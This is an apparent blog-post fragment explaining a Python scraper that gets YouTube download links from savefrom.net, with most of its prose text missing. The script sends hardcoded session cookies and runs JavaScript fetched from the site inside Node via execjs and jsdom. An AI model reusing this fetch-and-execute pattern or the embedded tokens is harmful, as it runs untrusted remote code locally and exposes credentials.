class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethtml</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># set the headers or the website will not return information</span></span><br><span class="line">    <span class="comment"># the cookies in here you may need to change</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&quot;</span></span><br><span class="line">                  <span class="string">&quot;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;lang=en; country=CN; uid=fd94a82a406a8dd4; sfHelperDist=72; reference=14; &quot;</span></span><br><span class="line">                  <span class="string">&quot;clickads-e2=90; poropellerAdsPush-e=63; promoBlock=64; helperWidget=92; &quot;</span></span><br><span class="line">                  <span class="string">&quot;helperBanner=42; framelessHdConverter=68; inpagePush2=68; popupInOutput=9; &quot;</span></span><br><span class="line">                  <span class="string">&quot;_ga=GA1.2.799702638.1610248969; _gid=GA1.2.628904587.1610248969; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSID=030393eb0776d20d0975f99b523a70d4; x-requested-with=; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSUD=islilfjn5alth33j9j8glj9776; _gat_helperWidget=1; _gat_inpagePush2=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://en.savefrom.net&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://en.savefrom.net/1-youtube-video-downloader-4/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;87\&quot;, \&quot;Not;A Brand\&quot;;v=\&quot;99\&quot;,\&quot;Chromium\&quot;;v=\&quot;87\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-dest&quot;</span>: <span class="string">&quot;iframe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-user&quot;</span>: <span class="string">&quot;?1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;upgrade-insecure-requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/87.0.4280.88 Safari/537.36&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># set the parameter, we can get from chrome</span></span><br><span class="line">    kv = &#123;<span class="string">&quot;sf_url&quot;</span>: url,</span><br><span class="line">          <span class="string">&quot;sf_submit&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;new&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">          <span class="string">&quot;app&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;country&quot;</span>: <span class="string">&quot;cn&quot;</span>,</span><br><span class="line">          <span class="string">&quot;os&quot;</span>: <span class="string">&quot;Windows&quot;</span>,</span><br><span class="line">          <span class="string">&quot;browser&quot;</span>: <span class="string">&quot;Chrome&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># do the POST request</span></span><br><span class="line">    r = requests.post(url=<span class="string">&quot;https://en.savefrom.net/savefrom.php&quot;</span>, headers=headers,</span><br><span class="line">                      data=kv)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="comment"># get the result</span></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br></pre></td></tr></table></figure><h3 id="2-"><a href="#2-" class="headerlink" title="2. "></a>2. </h3><h3 id="i-"><a href="#i-" class="headerlink" title="i. "></a>i. </h3><p>pythonjavascript<code>PyV8</code><code>execjs</code>js<code>execjs</code></p><h3 id="ii-js"><a href="#ii-js" class="headerlink" title="ii. js"></a>ii. js</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target(youtube address) url</span></span><br><span class="line">    url = <span class="string">&quot;https://www.youtube.com/watch?v=YPvtz1lHRiw&quot;</span></span><br><span class="line">    <span class="comment"># get the target text</span></span><br><span class="line">    reo = gethtml(url)</span><br><span class="line">    <span class="comment"># Remove the code from the head and tail (we need the javascript part, information store with encryption in js part)</span></span><br><span class="line">    reo = reo.split(<span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/script&gt;&quot;</span>)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><p><code>split</code></p><h3 id="iii-"><a href="#iii-" class="headerlink" title="iii. "></a>iii. </h3><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># split each line(help us find the decrypt function in last few line)</span></span><br><span class="line">    reA = reo.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="comment"># get the depcrypt function</span></span><br><span class="line">    name = reA[<span class="built_in">len</span>(reA) - <span class="number">3</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>] + <span class="string">&quot;;&quot;</span></span><br></pre></td></tr></table></figure><p><code>name</code>(hhh)</p><h3 id="iv-execjs"><a href="#iv-execjs" class="headerlink" title="iv. execjs"></a>iv. execjs</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use execjs to execute the js code, and the cwd is the result of `npm root -g`(the path of npm in your computer)</span></span><br><span class="line">    ct = execjs.<span class="built_in">compile</span>(reo)</span><br><span class="line">    <span class="comment"># do the decryption</span></span><br><span class="line">    text = ct.<span class="built_in">eval</span>(name.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><p><code>=</code>+<br>()</p><h4 id="1-thiswindow"><a href="#1-thiswindow" class="headerlink" title="1. thiswindow"></a>1. thiswindow</h4><p><code>this</code><code>$b</code><code>this</code><code>class</code>(thisclass)<code>npm</code><code>jsdom</code><code>execjs</code>window()<code>npm</code><code>jsdom</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">addition = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">const jsdom = require(&quot;jsdom&quot;);</span></span><br><span class="line"><span class="string">const &#123; JSDOM &#125; = jsdom;</span></span><br><span class="line"><span class="string">const dom = new JSDOM(`&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;`);</span></span><br><span class="line"><span class="string">window = dom.window;</span></span><br><span class="line"><span class="string">document = window.document;</span></span><br><span class="line"><span class="string">XMLHttpRequest = window.XMLHttpRequest;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># use execjs to execute the js code, and the cwd is the result of `npm root -g`(the path of npm in your computer)</span></span><br><span class="line">ct = execjs.<span class="built_in">compile</span>(addition + reo, cwd=<span class="string">r&#x27;C:\Users\xxx\AppData\Roaming\npm\node_modules&#x27;</span>)</span><br></pre></td></tr></table></figure><p></p><ul><li><code>cwd</code><code>npm root -g</code>npmmodules</li><li><code>addition</code><code>window</code><br></li></ul><h4 id="2-alert"><a href="#2-alert" class="headerlink" title="2. alert"></a>2. alert</h4><p><code>execjs</code><code>alert</code><code>alert</code><code>window</code><code>window</code><code>alert</code>(alert)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># override the alert function, because in the code there has one place using</span></span><br><span class="line">    <span class="comment"># and we cannot do the alerting in execjs(it is meaningless) however, if we donnot override, the code will raise a error</span></span><br><span class="line">    reo = reo.replace(<span class="string">&quot;(function()&#123;&quot;</span>, <span class="string">&quot;(function()&#123;\nthis.alert=function()&#123;&#125;;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="v-"><a href="#v-" class="headerlink" title="v. "></a>v. </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># target(youtube address) url</span></span><br><span class="line">    url = <span class="string">&quot;https://www.youtube.com/watch?v=YPvtz1lHRiw&quot;</span></span><br><span class="line">    <span class="comment"># get the target text</span></span><br><span class="line">    reo = gethtml(url)</span><br><span class="line">    <span class="comment"># Remove the code from the head and tail (we need the javascript part, information store with encryption in js part)</span></span><br><span class="line">    reo = reo.split(<span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/script&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># override the alert function, because in the code there has one place using</span></span><br><span class="line">    <span class="comment"># and we cannot do the alerting in execjs(it is meaningless) however, if we donnot override, the code will raise a error</span></span><br><span class="line">    reo = reo.replace(<span class="string">&quot;(function()&#123;&quot;</span>, <span class="string">&quot;(function()&#123;\nthis.alert=function()&#123;&#125;;&quot;</span>)</span><br><span class="line">    <span class="comment"># split each line(help us find the decrypt function in last few line)</span></span><br><span class="line">    reA = reo.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="comment"># get the depcrypt function</span></span><br><span class="line">    name = reA[<span class="built_in">len</span>(reA) - <span class="number">3</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>] + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="comment"># add jsdom into the execjs because the code will use(maybe there is a solution without jsdom, but i have no idea)</span></span><br><span class="line">    addition = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    const jsdom = require(&quot;jsdom&quot;);</span></span><br><span class="line"><span class="string">    const &#123; JSDOM &#125; = jsdom;</span></span><br><span class="line"><span class="string">    const dom = new JSDOM(`&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;`);</span></span><br><span class="line"><span class="string">    window = dom.window;</span></span><br><span class="line"><span class="string">    document = window.document;</span></span><br><span class="line"><span class="string">    XMLHttpRequest = window.XMLHttpRequest;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># use execjs to execute the js code, and the cwd is the result of `npm root -g`(the path of npm in your computer)</span></span><br><span class="line">    ct = execjs.<span class="built_in">compile</span>(addition + reo, cwd=<span class="string">r&#x27;C:\Users\19308\AppData\Roaming\npm\node_modules&#x27;</span>)</span><br><span class="line">    <span class="comment"># do the decryption</span></span><br><span class="line">    text = ct.<span class="built_in">eval</span>(name.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="3-"><a href="#3-" class="headerlink" title="3. "></a>3. </h3><h4 id="i-json"><a href="#i-json" class="headerlink" title="i. json"></a>i. json</h4><p>text<code>window.parent.sf.videoResult.show()</code>jsonjson</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get the result in json</span></span><br><span class="line">    result = re.search(<span class="string">&#x27;show\((.*?)\);;&#x27;</span>, text, re.I | re.M).group(<span class="number">0</span>).replace(<span class="string">&quot;show(&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;);;&quot;</span>, <span class="string">&quot;&quot;</span>)  </span><br></pre></td></tr></table></figure><h4 id="ii-json"><a href="#ii-json" class="headerlink" title="ii. json"></a>ii. json</h4><p>pythonjson<code>json</code>(import)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use `json` to load json</span></span><br><span class="line">    j = json.loads(result)</span><br></pre></td></tr></table></figure><h4 id="iii-"><a href="#iii-" class="headerlink" title="iii. "></a>iii. </h4><p>json<code>j[&quot;url&quot;][num][&quot;url&quot;]</code><code>num</code>()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># the selection of video(in this case, num=1 mean the video is</span></span><br><span class="line">    <span class="comment"># - 360p known from j[&quot;url&quot;][num][&quot;quality&quot;]</span></span><br><span class="line">    <span class="comment"># - MP4 known from j[&quot;url&quot;][num][&quot;type&quot;]</span></span><br><span class="line">    <span class="comment"># - audio known from j[&quot;url&quot;][num][&quot;audio&quot;]</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    downurl = j[<span class="string">&quot;url&quot;</span>][num][<span class="string">&quot;url&quot;</span>]</span><br><span class="line">    <span class="comment"># do some download</span></span><br><span class="line">    <span class="comment"># thanks :)</span></span><br><span class="line">    <span class="comment"># - EOF -</span></span><br></pre></td></tr></table></figure><h2 id="3-"><a href="#3-" class="headerlink" title="3. "></a>3. </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time: 2021/1/10</span></span><br><span class="line"><span class="comment"># @Author: Eritque arcus</span></span><br><span class="line"><span class="comment"># @File: Youtube.py</span></span><br><span class="line"><span class="comment"># @License: MIT</span></span><br><span class="line"><span class="comment"># @Environment:</span></span><br><span class="line"><span class="comment">#           - windows 10</span></span><br><span class="line"><span class="comment">#           - python 3.6.2</span></span><br><span class="line"><span class="comment"># @Dependence:</span></span><br><span class="line"><span class="comment">#           - jsdom in npm(windows also can use)</span></span><br><span class="line"><span class="comment">#           - requests, execjs, re, json in python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gethtml</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="comment"># set the headers or the website will not return information</span></span><br><span class="line">    <span class="comment"># the cookies in here you may need to change</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,&quot;</span></span><br><span class="line">                  <span class="string">&quot;*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;accept-language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cookie&quot;</span>: <span class="string">&quot;lang=en; country=CN; uid=fd94a82a406a8dd4; sfHelperDist=72; reference=14; &quot;</span></span><br><span class="line">                  <span class="string">&quot;clickads-e2=90; poropellerAdsPush-e=63; promoBlock=64; helperWidget=92; &quot;</span></span><br><span class="line">                  <span class="string">&quot;helperBanner=42; framelessHdConverter=68; inpagePush2=68; popupInOutput=9; &quot;</span></span><br><span class="line">                  <span class="string">&quot;_ga=GA1.2.799702638.1610248969; _gid=GA1.2.628904587.1610248969; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSID=030393eb0776d20d0975f99b523a70d4; x-requested-with=; &quot;</span></span><br><span class="line">                  <span class="string">&quot;PHPSESSUD=islilfjn5alth33j9j8glj9776; _gat_helperWidget=1; _gat_inpagePush2=1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;https://en.savefrom.net&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>,</span><br><span class="line">        <span class="string">&quot;referer&quot;</span>: <span class="string">&quot;https://en.savefrom.net/1-youtube-video-downloader-4/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua&quot;</span>: <span class="string">&quot;\&quot;Google Chrome\&quot;;v=\&quot;87\&quot;, \&quot;Not;A Brand\&quot;;v=\&quot;99\&quot;,\&quot;Chromium\&quot;;v=\&quot;87\&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-ch-ua-mobile&quot;</span>: <span class="string">&quot;?0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-dest&quot;</span>: <span class="string">&quot;iframe&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-mode&quot;</span>: <span class="string">&quot;navigate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-site&quot;</span>: <span class="string">&quot;same-origin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sec-fetch-user&quot;</span>: <span class="string">&quot;?1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;upgrade-insecure-requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                      <span class="string">&quot;Chrome/87.0.4280.88 Safari/537.36&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># set the parameter, we can get from chrome</span></span><br><span class="line">    kv = &#123;<span class="string">&quot;sf_url&quot;</span>: url,</span><br><span class="line">          <span class="string">&quot;sf_submit&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;new&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;lang&quot;</span>: <span class="string">&quot;en&quot;</span>,</span><br><span class="line">          <span class="string">&quot;app&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">          <span class="string">&quot;country&quot;</span>: <span class="string">&quot;cn&quot;</span>,</span><br><span class="line">          <span class="string">&quot;os&quot;</span>: <span class="string">&quot;Windows&quot;</span>,</span><br><span class="line">          <span class="string">&quot;browser&quot;</span>: <span class="string">&quot;Chrome&quot;</span>&#125;</span><br><span class="line">    <span class="comment"># do the POST request</span></span><br><span class="line">    r = requests.post(url=<span class="string">&quot;https://en.savefrom.net/savefrom.php&quot;</span>, headers=headers,</span><br><span class="line">                      data=kv)</span><br><span class="line">    r.raise_for_status()</span><br><span class="line">    <span class="comment"># get the result</span></span><br><span class="line">    <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># target(youtube address) url</span></span><br><span class="line">    url = <span class="string">&quot;https://www.youtube.com/watch?v=YPvtz1lHRiw&quot;</span></span><br><span class="line">    <span class="comment"># get the target text</span></span><br><span class="line">    reo = gethtml(url)</span><br><span class="line">    <span class="comment"># Remove the code from the head and tail (we need the javascript part, information store with encryption in js part)</span></span><br><span class="line">    reo = reo.split(<span class="string">&quot;&lt;script type=\&quot;text/javascript\&quot;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/script&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># override the alert function, because in the code there has one place using</span></span><br><span class="line">    <span class="comment"># and we cannot do the alerting in execjs(it is meaningless) however, if we donnot override, the code will raise a error</span></span><br><span class="line">    reo = reo.replace(<span class="string">&quot;(function()&#123;&quot;</span>, <span class="string">&quot;(function()&#123;\nthis.alert=function()&#123;&#125;;&quot;</span>)</span><br><span class="line">    <span class="comment"># split each line(help us find the decrypt function in last few line)</span></span><br><span class="line">    reA = reo.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="comment"># get the depcrypt function</span></span><br><span class="line">    name = reA[<span class="built_in">len</span>(reA) - <span class="number">3</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>] + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="comment"># add jsdom into the execjs because the code will use(maybe there is a solution without jsdom, but i have no idea)</span></span><br><span class="line">    addition = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    const jsdom = require(&quot;jsdom&quot;);</span></span><br><span class="line"><span class="string">    const &#123; JSDOM &#125; = jsdom;</span></span><br><span class="line"><span class="string">    const dom = new JSDOM(`&lt;!DOCTYPE html&gt;&lt;p&gt;Hello world&lt;/p&gt;`);</span></span><br><span class="line"><span class="string">    window = dom.window;</span></span><br><span class="line"><span class="string">    document = window.document;</span></span><br><span class="line"><span class="string">    XMLHttpRequest = window.XMLHttpRequest;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># use execjs to execute the js code, and the cwd is the result of `npm root -g`(the path of npm in your computer)</span></span><br><span class="line">    ct = execjs.<span class="built_in">compile</span>(addition + reo, cwd=<span class="string">r&#x27;C:\Users\19308\AppData\Roaming\npm\node_modules&#x27;</span>)</span><br><span class="line">    <span class="comment"># do the decryption</span></span><br><span class="line">    text = ct.<span class="built_in">eval</span>(name.split(<span class="string">&quot;=&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&quot;;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    <span class="comment"># get the result in json</span></span><br><span class="line">    result = re.search(<span class="string">&#x27;show\((.*?)\);;&#x27;</span>, text, re.I | re.M).group(<span class="number">0</span>).replace(<span class="string">&quot;show(&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;);;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># use `json` to load json</span></span><br><span class="line">    j = json.loads(result)</span><br><span class="line">    <span class="comment"># the selection of video(in this case, num=1 mean the video is</span></span><br><span class="line">    <span class="comment"># - 360p known from j[&quot;url&quot;][num][&quot;quality&quot;]</span></span><br><span class="line">    <span class="comment"># - MP4 known from j[&quot;url&quot;][num][&quot;type&quot;]</span></span><br><span class="line">    <span class="comment"># - audio known from j[&quot;url&quot;][num][&quot;audio&quot;]</span></span><br><span class="line">    num = <span class="number">1</span></span><br><span class="line">    downurl = j[<span class="string">&quot;url&quot;</span>][num][<span class="string">&quot;url&quot;</span>]</span><br><span class="line">    <span class="comment"># do some download</span></span><br><span class="line">    <span class="comment"># thanks :)</span></span><br><span class="line">    <span class="comment"># - EOF -</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>102</li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Environment:</span></span><br><span class="line"><span class="comment">#           - windows 10</span></span><br><span class="line"><span class="comment">#           - python 3.6.2</span></span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Dependence:</span></span><br><span class="line"><span class="comment">#           - jsdom in npm(windows also can use)</span></span><br><span class="line"><span class="comment">#           - requests, execjs, re, json in python</span></span><br></pre></td></tr></table></figure><center>-end-</center></li></ul>]]></content>
      
      
      <categories>
          
          <category> HelperCodes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Web crawler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kotlin/javaMirai</title>
      <link href="/2020/12/28/Mirai-qq%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%A1%86%E6%9E%B6kotlin_java%E6%95%99%E7%A8%8B/"/>
